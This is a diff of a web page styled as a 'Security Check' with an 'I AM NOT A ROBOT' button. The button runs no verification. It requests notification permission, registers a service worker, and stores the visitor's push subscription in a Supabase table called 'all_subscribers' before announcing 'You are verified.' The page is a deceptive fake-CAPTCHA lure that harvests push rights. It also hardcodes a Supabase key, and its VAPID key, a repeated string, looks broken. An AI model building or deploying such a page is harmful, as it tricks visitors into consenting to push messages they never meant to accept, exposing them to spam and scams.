@@ -2,74 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
         .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        #btn { background-color: #1877f2; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        #btn { background-color: #1877f2; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; display: block; margin: 0 auto; }
         #status { margin-top: 15px; font-size: 13px; color: #65676b; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Security Check</h2>
-    <button id="btn">I AM NOT A ROBOT</button>
-    <p id="status">System Ready</p>
-</div>
+    <div class="card">
+        <h2>Security Check</h2>
+        <button id="btn">I AM NOT A ROBOT</button>
+        <p id="status">System Ready</p>
+    </div>
 
-<script>
-    const SB_URL = "https://smikpuwdbfqcqrsbhqnf.supabase.co";
-    const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNtaWtwdXdkYmZxY3Fyc2JocW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NjMxODIsImV4cCI6MjA4NjMzOTE4Mn0.-s4dG3cfhcgqAVoP1UG3DZDm8gNnzqvdIZZylKTpg98";
-    const _supabase = supabase.createClient(SB_URL, SB_KEY);
+    <script>
+        // 1. Setup Supabase
+        const SB_URL = "https://smikpuwdbfqcqrsbhqnf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNtaWtwdXdkYmZxY3Fyc2JocW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NjMxODIsImV4cCI6MjA4NjMzOTE4Mn0.-s4dG3cfhcgqAVoP1UG3DZDm8gNnzqvdIZZylKTpg98";
+        const _supabase = supabase.createClient(SB_URL, SB_KEY);
 
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
 
-    function urlBase64ToUint8Array(base64String) {
-        const padding = '='.repeat((4 - base64String.length % 4) % 4);
-        const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-        const rawData = window.atob(base64);
-        return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
-    }
-
-    btn.onclick = async () => {
-        try {
-            status.innerText = "Requesting permission...";
-            const permission = await Notification.requestPermission();
-            
-            if (permission !== 'granted') {
-                status.innerText = "Permission denied. Reset site settings.";
-                return;
-            }
-
-            // Register Worker (Ensure sw.js is in your Vercel root!)
-            const registration = await navigator.serviceWorker.register('/sw.js');
-            
-            // Get the Token
-            // This is a generic Public VAPID Key for testing
-            const publicVapidKey = 'BEl62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI_R8l62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI';
-            const subscription = await registration.pushManager.subscribe({
-                userVisibleOnly: true,
-                applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
-            });
-
-            // SAVE TO SUPABASE (Directly into the new table)
-            status.innerText = "Saving token...";
-            const { error } = await _supabase
-                .from('all_subscribers')
-                .insert([{ subscription_data: subscription }]);
-
-            if (error && error.code !== '23505') throw error; // Ignore error if token already exists
-
-            status.innerHTML = "<b style='color:green'>✅ VERIFIED!</b><br>Token saved to database.";
-            
-        } catch (err) {
-            status.innerText = "Error: " + err.message;
-            console.error(err);
+        // Helper to handle the encryption key
+        function urlBase64ToUint8Array(base64String) {
+            const padding = '='.repeat((4 - base64String.length % 4) % 4);
+            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
+            const rawData = window.atob(base64);
+            return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
         }
-    };
-</script>
+
+        // 2. Click Logic
+        btn.onclick = async () => {
+            try {
+                status.innerText = "Step 1: Requesting permission...";
+                const permission = await Notification.requestPermission();
+                
+                if (permission !== 'granted') {
+                    status.innerText = "Permission denied. Reset settings in URL bar.";
+                    return;
+                }
+
+                status.innerText = "Step 2: Connecting worker...";
+                // Make sure sw.js exists in the same folder on Vercel!
+                const registration = await navigator.serviceWorker.register('/sw.js');
+                
+                status.innerText = "Step 3: Creating token...";
+                const publicVapidKey = 'BEl62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI_R8l62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI';
+                
+                const subscription = await registration.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
+                });
+
+                status.innerText = "Step 4: Sending to Supabase...";
+                const { error } = await _supabase
+                    .from('all_subscribers')
+                    .insert([{ subscription_data: subscription }]);
+
+                if (error && error.code !== '23505') throw error;
+
+                status.innerHTML = "<b style='color:green'>✅ SUCCESS!</b><br>You are verified.";
+                
+            } catch (err) {
+                status.innerText = "Error: " + err.message;
+                console.error("FULL ERROR:", err);
+            }
+        };
+    </script>
 </body>
 </html>
